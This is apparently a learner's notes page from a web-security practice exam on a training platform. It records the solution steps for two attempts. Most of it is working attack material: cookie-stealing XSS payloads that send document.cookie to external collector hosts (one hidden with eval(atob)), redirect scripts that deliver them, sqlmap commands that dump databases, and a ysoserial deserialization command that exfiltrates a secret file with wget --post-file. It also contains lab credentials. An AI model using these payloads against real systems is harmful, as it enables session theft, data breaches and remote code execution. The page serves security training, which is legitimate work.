---
layout: default
title: "Practice Test"
parent: "Web Application"
nav_order: 25
---

# 1
## Initial Access
search term = `-img%2520src%3Dhttps%3A%2F%2Fexploit%2D0a2b00a503075e0b817da20c01700052%2Eexploit%2Dserver%2Enet-`
- ~~That gets a ping from the victim to the exploit server~~

`https://0adb0045036e5ed2816fa37900770042.web-security-academy.net/?SearchTerm="-alert(1)-"test1`

`"-new Image().src='https://exploit-0a2b00a503075e0b817da20c01700052.exploit-server.net/log?c='+encodeURIComponent(document.cookie)-"`
- `"Potentially dangerous search term"`

This doesn't work:
```js
<script>
fetch('https://0ad800350397ebae82f6a63300800011.web-security-academy.net/refreshpassword?username=attacker%40exploit-0acf003d0341eba58281a5a901b50078.exploit-server.net', {
method: 'POST',
mode: 'no-cors'
});
</script>
```
- also not with a `GET ?username=`
-  page says Username or email, but the parameter = email


### Search Bar
```
"+eval(atob("ZmV0Y2goImh0dHBzOi8veG1uNzFqaWd3a283ajN3NjNvanhvcTBkbTRzdmdvNGQub2FzdGlmeS5jb20vP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp"))}//
```
- `ZmV0Y2goImh0dHBzOi8veG1uNzFqaWd3a283ajN3NjNvanhvcTBkbTRzdmdvNGQub2FzdGlmeS5jb20vP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp` = `fetch("https://xmn71jigwko7j3w63ojxoq0dm4svgo4d.oastify.com/?c="+btoa(document['cookie']))`
- Search this to get my cookie in the oastify `c` parameter

**Solution:**
```
<script>
location='https://0a56004d03ae106280cc03a400980053.web-security-academy.net/?SearchTerm=%22%2Beval%28atob%28%22ZmV0Y2goImh0dHBzOi8veG1uNzFqaWd3a283ajN3NjNvanhvcTBkbTRzdmdvNGQub2FzdGlmeS5jb20vP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp%22%29%29%7D%2F%2F';
</script>
```
- uses the above, but just copies from the URL rather than dealing with parentheses
- returns session cookie in base64
- ==`carlos:93c2516debbc64a4`==

## Privilege Escalation

SQLMAP: 

```
sqlmap -u 'https://0a7f00e00480817d80aa0383000a00f9.web-security-academy.net/advanced_search?SearchTerm=&organize_by=DATE&blogArtist=Si+Test' -H 'cookie: _lab=46%7cMCwCFHHIBDch3tvZQ3hhaaWEbaNbHU5GAhRXAZbqKZG57eY8%2fvIiYd2xjpbmaVrisbYcGYHw0aXtnOl00Vvdb0rg1qeEubap3XuIVHx3SmQUi1P7yh8UYziGO%2f1bt8uRLoburVyQZGQqkg5%2fD8AmH3my9y50DQry31CVKT5UbVMVJtM%3d; session=s9xbtWfTxqS6WzUn63l5Mbc4i0IT7Que' -p 'organize_by' --dbms postgresql --level 5 --dump
```
- `-p` = parameter to test with (`organize_by`)
- maybe should have started with something else to get the `--dbms` because that took forever with the other version
- Had to fiddle with this a little bit
- ==Don't keep signing in and out!== **The cookies will change, which breaks sqlmap.**

`administrator`:`b235d711d5858825`

## Execution
`java -jar /home/cgrigsby/Desktop/ysoserial-all.jar CommonsCollections6 'wget http://dp66zjwq4p0pxs44rpbplgkz6qch0eo3.oastify.com --post-file=/home/carlos/secret' | gzip -c | base64 -w 0`
- Got an error that said gzip format
- Had to change to java 11 for this
	- ==May need to be run with that== 
	- `/usr/lib/jvm/java-11-openjdk/bin/java -jar /home/cgrigsby/Desktop/ysoserial-all.jar...`
- ==The output is base64, that's fine==, but **it needs to be URL encoded**
- Had to try a few different Common Connections
	- *I suspect this will be a tricky part in the future, but different attempts showed different errors which may help a little bit in the future*

**Note:** Going with deserialization did require the guide, but honestly it was pretty clear from there not really being any additional functionality from the `/admin` panel besides deleting a user and seeing the clear deserialization in the request. 


# 2

## Initial Access

`https://0a3a00f204c67118809303d200490086.web-security-academy.net/?SearchTerm=%5Ctrees`
search: `\trees` shows results for `rees`
- `\\trees`:`\trees`
- `\\\trees`:`\ rees`
- `\\\\trees`:`\\trees`
- `\\\\\trees`:`\\ rees`

**Clue**: 
```
"-Function`alert\x28document.cookie\x29```-"

"-Function`location='https://exploit-0a7400fc04a2eafa808702f3012900bc.exploit-server.net/?c='+document.cookie```-"
```
This does generate the cookie!


**Solution**: 
```
<script>
location='https://0ade007b0411ea108080036f00fc00b2.web-security-academy.net/?find=%22%2DFunction%60location%3D%27https%3A%2F%2Fexploit%2D0a7400fc04a2eafa808702f3012900bc%2Eexploit%2Dserver%2Enet%2F%3Fc%3D%27%2Bdocument%2Ecookie%60%60%60%2D%22'
</script> 
```
where
```
"-Function`location='https://exploit-0a7400fc04a2eafa808702f3012900bc.exploit-server.net/?c='+document.cookie```-"
```
is URL Encoded with `Encode all special chars` checked
## Privilege Escalation
pw = `0Bd8d5LNWM2fNcXxsqhKyBL2Ehzy3hj5`

```
sqlmap -u 'https://0a9c00c4031bc7a281ce758000160093.web-security-academy.net/filtered_search?find=cizipbkq&organize=4&order=ASC*&BlogArtist=Sophie+Mail' --random-agent --time-sec 10 --cookie='session=NSC5N2f6AtuwQVMtRq497Kd7grzCQCDD' --level 5 and --risk 3 --dbs --tamper="between,randomcase,space2comment" --dmbs postgresql 

or 

sqlmap 'https://0a9c00c4031bc7a281ce758000160093.web-security-academy.net/filtered_search?find=qweqwe&organize=5&order=&BlogArtist=' --headers='Cookie:session=NSC5N2f6AtuwQVMtRq497Kd7grzCQCDD' --dbms postgresql -p 'order' --level 5  --technique E --passwords
```

**Solution**:
```bash
sqlmap -u 'https://0a9c00c4031bc7a281ce758000160093.web-security-academy.net/filtered_search?find=cizipbkq&organize=4&order=ASC*&BlogArtist=Sophie+Mail' --random-agent --time-sec 10 --cookie='session=NSC5N2f6AtuwQVMtRq497Kd7grzCQCDD' --level 5 and --risk 3 --tamper="between,randomcase,space2comment" --dbms postgresql -D public --dump
```
## Execution

